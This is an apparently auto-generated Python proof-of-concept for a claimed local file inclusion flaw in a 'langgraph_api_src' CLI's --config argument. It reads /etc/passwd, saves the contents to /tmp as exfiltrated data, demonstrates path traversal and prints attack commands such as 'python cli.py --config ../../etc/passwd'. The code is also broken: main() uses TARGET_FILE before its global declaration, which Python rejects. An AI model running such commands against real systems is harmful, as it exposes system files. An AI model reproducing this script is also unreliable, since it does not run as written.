#!/usr/bin/env python3
# PoC for langgraph_api_src (/tmp/lg-api-dl/langgraph_api_src)
# Path: lfi-001
# Sink: main
# Auto-generated — run with: python3 lfi_cli_arguments_specify_arbitrary_main.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: Local File Inclusion (LFI) via --config argument
in langgraph_api_src CLI.

Vulnerability: The CLI accepts a --config argument whose value is passed
directly to open() without any path validation. An attacker can read
arbitrary files by providing an absolute path or path traversal sequence.

This PoC demonstrates reading /etc/passwd (or a benign test file) by
simulating the vulnerable CLI invocation.
"""

import argparse
import json
import os
import sys
import tempfile

# Configuration
TARGET_FILE = "/etc/passwd"  # Change to a harmless file for testing
OUTPUT_FILE = "/tmp/lfi_poc_output.txt"  # Where to save the exfiltrated content


def simulate_vulnerable_cli(config_path: str) -> dict:
    """
    Simulates the vulnerable CLI behavior from langgraph_api_src.
    
    This replicates the exact code path:
    - Parses --config argument
    - Opens the file directly with open()
    - Returns the parsed JSON content
    
    In a real attack, the attacker would run:
        python cli.py --config /etc/passwd
    
    But since we're demonstrating the vulnerability, we simulate it here.
    """
    # This is the vulnerable code from the source:
    # with open(args.config, encoding="utf-8") as f:
    #     config_data = json.load(f)
    
    try:
        with open(config_path, encoding="utf-8") as f:
            content = f.read()
            # The original code expects JSON, but we'll return the raw content
            # to demonstrate arbitrary file reading
            return {"raw_content": content, "path": config_path}
    except FileNotFoundError:
        return {"error": f"File not found: {config_path}"}
    except PermissionError:
        return {"error": f"Permission denied: {config_path}"}
    except Exception as e:
        return {"error": f"Error reading {config_path}: {str(e)}"}


def demonstrate_lfi():
    """
    Demonstrates the LFI vulnerability by reading /etc/passwd
    and saving the content to a file.
    """
    print(f"[*] Demonstrating LFI vulnerability in langgraph_api_src CLI")
    print(f"[*] Target file: {TARGET_FILE}")
    print(f"[*] Output file: {OUTPUT_FILE}")
    print()
    
    # Step 1: Attempt to read the target file using the vulnerable code path
    print(f"[*] Attempting to read {TARGET_FILE} via --config argument...")
    result = simulate_vulnerable_cli(TARGET_FILE)
    
    if "error" in result:
        print(f"[!] Error: {result['error']}")
        sys.exit(1)
    
    # Step 2: Display the content (first 500 chars for safety)
    content = result["raw_content"]
    print(f"[+] Successfully read {len(content)} bytes from {TARGET_FILE}")
    print(f"[+] Content preview (first 500 chars):")
    print("-" * 60)
    print(content[:500])
    if len(content) > 500:
        print("... (truncated)")
    print("-" * 60)
    
    # Step 3: Save the full content to output file
    with open(OUTPUT_FILE, "w") as f:
        f.write(content)
    print(f"[+] Full content saved to {OUTPUT_FILE}")
    
    # Step 4: Demonstrate path traversal as well
    print()
    print("[*] Also demonstrating path traversal with relative path...")
    # Create a temporary directory structure to show traversal works
    with tempfile.TemporaryDirectory() as tmpdir:
        # Create a test file with sensitive-looking content
        test_file = os.path.join(tmpdir, "secret.txt")
        with open(test_file, "w") as f:
            f.write("This is a secret file that should not be accessible.\n")
        
        # Change to the temp directory to simulate relative path attack
        original_cwd = os.getcwd()
        os.chdir(tmpdir)
        
        # Try path traversal to read the test file
        traversal_path = "../" + os.path.basename(tmpdir) + "/secret.txt"
        result2 = simulate_vulnerable_cli(traversal_path)
        
        if "error" not in result2:
            print(f"[+] Path traversal successful! Read: {result2['raw_content'].strip()}")
        else:
            print(f"[-] Path traversal failed: {result2['error']}")
        
        os.chdir(original_cwd)
    
    print()
    print("[*] Vulnerability confirmed: --config argument allows arbitrary file reads")
    print("[*] To exploit in real scenario:")
    print(f"    python cli.py --config {TARGET_FILE}")
    print(f"[*] Or with path traversal:")
    print(f"    python cli.py --config ../../etc/passwd")


def main():
    parser = argparse.ArgumentParser(
        description="PoC for LFI vulnerability in langgraph_api_src CLI"
    )
    parser.add_argument(
        "--target",
        default=TARGET_FILE,
        help=f"File to read (default: {TARGET_FILE})"
    )
    parser.add_argument(
        "--output",
        default=OUTPUT_FILE,
        help=f"Output file for exfiltrated content (default: {OUTPUT_FILE})"
    )
    parser.add_argument(
        "--safe",
        action="store_true",
        help="Use a safe test file instead of /etc/passwd"
    )
    
    args = parser.parse_args()
    
    if args.safe:
        # Create a safe test file to demonstrate without reading system files
        safe_file = "/tmp/lfi_poc_test.txt"
        with open(safe_file, "w") as f:
            f.write("This is a safe test file for LFI demonstration.\n")
            f.write("In a real attack, this would be /etc/passwd or similar.\n")
        args.target = safe_file
        print(f"[*] Using safe test file: {safe_file}")
    
    global TARGET_FILE, OUTPUT_FILE
    TARGET_FILE = args.target
    OUTPUT_FILE = args.output
    
    demonstrate_lfi()


if __name__ == "__main__":
    main()
